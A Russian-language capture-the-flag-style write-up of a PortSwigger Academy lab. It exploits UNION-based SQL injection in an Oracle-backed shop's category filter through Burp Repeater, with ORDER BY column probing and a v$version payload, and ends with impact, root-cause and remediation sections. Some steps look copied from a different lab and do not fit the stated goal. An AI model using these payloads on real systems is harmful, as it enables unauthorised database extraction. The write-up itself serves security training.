# SQL injection attack, querying the database type and version on Oracle

**Категория:** SQL Injection
**Сложность лабы:** Practitioner
**Платформа:** PortSwigger Web Security Academy
**Тип уязвимости:** SQL Injection, querying the database type and version on Oracle
**Инструменты:** Burp Suite (Proxy, Repeater)

---

## Цель

Приложение — интернет-магазин с категориями товаров. В этой лабораторной работе обнаружена уязвимость SQL-инъекции в фильтре категорий товаров. Для получения результатов из внедренного запроса можно использовать атаку UNION.
Для решения лабораторной работы отобразите строку версии базы данных.

## Описание уязвимости

Приложение формирует SQL-запрос на бэкенде примерно так:

```sql
SELECT * FROM products WHERE category = 'Toys & Games'
```

Значение категории берётся из параметра запроса без должной валидации и подставляется напрямую в запрос. Это позволяет модифицировать логику `WHERE`-условия и полностью убрать фильтр `released = 1`, добавив всегда истинное условие через `OR`.

## Методология

### 1. Recon

Открыл каталог товаров, выбрал произвольную категорию (например, "Gifts") и через Burp Suite Proxy перехватил GET-запрос, отвечающий за фильтрацию:

```
GET /filter?category=Toys+%26+Games HTTP/2
Host: 0a8100590400ed088075120b00b40002.web-security-academy.net
```

### 2. Проверка инъекции

Отправил запрос в Burp Repeater. Добавил к значению `category` параметр, для проверки сколько столбцов в SQL-запросе, для понятия логики, сколько столбцов для ввода, перед тем как переходить к `UNION`-запросу. Остановился на том моменте, когда база стала выдавать `500` - информация, что столбца не существует:

```
category=Toys+%26+Games'+ORDER+BY+2--+-
```

Логика запроса на бэкенде превращается в:

```sql
SELECT * FROM products WHERE category = 'Toys & Games' ORDER BY 2-- -' AND released = 1 
```

`-- -` комментирует остаток исходного запроса, включая закрывающую кавычку после выяснения столбцов, мы отсекаем конец, где `AND released = 1` - является флагом, для выпущенных продуктов. 
### 3. Отправка и проверка результата

Отправил модифицированный запрос через Repeater. В ответе сервера (HTTP 200) в теле страницы появились дополнительные товары, отсутствовавшие в исходном списке, — в том числе непубликуемые (unreleased) позиции.

## Payload

```
category=Toys+%26+Games'+UNION+SELECT+banner,+NULL+FROM+v$version--+-
```

Логика запроса на бэкенде превращается в:

```sql
SELECT * FROM products WHERE category = 'Toys & Games' UNION SELECT banner, NULL FROM v$version-- -' AND released = 1 
```

## Результат

Лаба пройдена — узнали версию СУБД.

### **Impact (Потенциальное влияние в реальном приложении)**

- **Несанкционированное извлечение данных (Data Exfiltration):** Возможность использования техники `UNION SELECT` позволяет злоумышленнику выгружать любые данные из базы, к которым имеет доступ учетная запись СУБД (включая системные таблицы, хэши паролей, персональные и финансовые данные клиентов).
- **Сбор информации об инфраструктуре (Reconnaissance / Fingerprinting):** Успешное чтение системного представления `v$version` раскрывает точную версию СУБД Oracle и окружения, что упрощает подбор эксплойтов под специфические уязвимости конкретной сборки.
- **Обход логики фильтрации и ограничений доступа:** Отсечение условий вроде `AND released = 1` через комментарий позволяет получить доступ к скрытым, архивным или черновиковым записям каталога.
- **Потенциальная эскалация атаки:** При наличии расширенных прав у служебной учетной записи СУБД возможны запись/чтение файлов на уровне операционной системы или выполнение системных команд.

### **Root Cause (Первопричина)**

- **Небезопасная конкатенация строк:** Значение GET-параметра `category` напрямую встраивается в SQL-запрос на стороне бэкенда без использования параметризованных выражений (prepared statements / parameterized queries).
- **Отсутствие валидации и санитизации:** Сервер не проверяет входные данные по белому списку (allowlist) допустимых категорий и не экранирует специальные символы (одинарные кавычки `'`, символы комментариев `--`).

### **Remediation (Рекомендации по устранению)**

- **Использование параметризованных запросов (Prepared Statements):** Применять плейсхолдеры (bind variables) для всех параметров выборки — это гарантирует, что данные пользователя будут интерпретироваться СУБД исключительно как литерал, а не как исполняемый SQL-код.
- **Строгая валидация входных данных (Allowlist Validation):** Проверять значение параметра `category` на соответствие списку существующих категорий перед формированием запроса.
- **Принцип наименьших привилегий (Least Privilege):** Ограничить права пользователя БД, от имени которого работает веб-приложение: запретить доступ к системным представлениям (`v$version`, `all_tables` и т.д.) и ограничить права только необходимыми таблицами (`SELECT` для каталога).
- **Корректная обработка ошибок (Error Handling):** Отключить вывод подробных сообщений об ошибках базы данных пользователю, чтобы не раскрывать структуру запросов и архитектуру СУБД (предотвращение Error-based разведки).
- **WAF (Web Application Firewall):** Настроить сигнатурный и поведенческий анализ для блокировки запросов с признаками инъекций (`UNION SELECT`, SQL-комментарии) в качестве дополнительного эшелона защиты.
